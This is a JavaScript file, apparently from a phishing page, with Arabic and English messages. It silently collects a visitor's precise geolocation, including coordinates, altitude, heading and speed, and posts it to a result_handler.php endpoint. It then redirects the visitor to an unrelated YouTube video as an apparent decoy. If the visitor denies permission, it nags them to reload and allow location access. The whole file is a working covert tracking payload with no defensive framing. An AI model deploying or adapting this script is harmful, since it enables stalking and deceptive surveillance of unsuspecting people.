function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('لا يدعم المستعرض الخاص بك تحديد الموقع الجغرافي...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    if( lat ){
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if( lon ){
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if( acc ){
      acc = acc + ' m';
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if( alt ){
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if( dir ){
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if( spd ){
      spd = spd + ' m/s';
    }
    else {
      spd = 'غير متوفر';
    }

    var ok_status = 'تم بنجاح';
//custom url
    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: {Status: ok_status,Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
      success: function(){window.location='https://www.youtube.com/watch?v=iEXlGTWGgW8&ab_channel=9to5Google';},
      mimeType: 'text'
    });
  };
}

function showError(error)
{
  var err_text;
  var err_status = 'فشل ! أعد التحميل';

	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			err_text = 'رفض المستخدم طلب تحديد الموقع الجغرافي';
      alert('يرجى تحديث هذه الصفحة والسماح بإذن الموقع...');
      break;
		case error.POSITION_UNAVAILABLE:
			err_text = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			err_text = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			err_text = 'An unknown error occurred';
			break;
	}

  $.ajax({
    type: 'POST',
    url: 'error_handler.php',
    data: {Status: err_status, Error: err_text},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
